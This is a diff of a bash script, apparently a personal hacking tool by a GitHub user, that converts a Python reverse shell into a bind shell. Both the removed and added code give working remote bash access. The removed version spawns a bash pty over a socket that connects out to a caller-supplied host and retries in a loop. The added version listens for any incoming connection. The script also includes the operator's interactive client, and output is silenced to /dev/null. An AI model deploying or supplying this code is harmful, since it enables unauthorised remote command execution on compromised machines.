@@ -1,6 +1,6 @@
 #!/bin/bash
 # Created by @rvcgeeks____ <github.com/rvcgeeks> @Pune, India @12/12/2019, 1:15 am
-# Reverse shell script in python
+# Bind shell script in python
 
   case $1 in
 
@@ -9,37 +9,36 @@
     while [ 1 ] ; do
       python -c "import socket, pty, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((socket.gethostbyname('$2'), $3))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
+s.bind((socket.gethostbyname('$2'), $3))
+s.listen(128)
+c, a = s.accept()
+os.dup2(c.fileno(), 0)
+os.dup2(c.fileno(), 1)
+os.dup2(c.fileno(), 2)
 pty.spawn('/bin/bash')" >> /dev/null 2>&1 
-      sleep 5;
     done
     ;;
 
 
   open)
     echo '[38;2;255;0;0m ▏▎▍▌▋▉█▇▆▅▄▃▂▁ ▁▂▃▄▅▆▇█▉▊▊▋▌▍▎▏▏▎▍▌▋▉█▇▆▅▄▃▂▁ ▁▂▃▄▅▆▇█▉▊▊▋▌▍[0m
-[48;2;255;0;0m[1;94m[38;2;255;255;255m                🤖🐉💻 RVC REVERSE SHELL 💻🐉🤖              [0m'
+[48;2;255;0;0m[1;94m[38;2;255;255;255m                 🤖🐉💻 RVC BIND SHELL 💻🐉🤖                [0m'
     sizes=$(stty size)
     rows=$(echo $sizes | awk '{print $1}')
     columns=$(echo $sizes | awk '{print $2}')
     python -c "import socket, os, tty, termios, thread
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((socket.gethostbyname('$2'), $3))
-s.listen(128)
-c, a = s.accept()
-c.send('stty rows $rows columns $columns\n')
+s.connect((socket.gethostbyname('$2'), $3))
+s.send('stty rows $rows columns $columns\n')
 def hear():
     while True:
-        os.write(1, c.recv(1))
+        os.write(1, s.recv(1))
 thread.start_new_thread(hear, tuple())
 old_sett = termios.tcgetattr(0)
 tty.setraw(0)
 while True:
   try:
-    c.send(os.read(0, 1))
+    s.send(os.read(0, 1))
   except:
     break
 termios.tcsetattr(0, termios.TCSADRAIN, old_sett)"
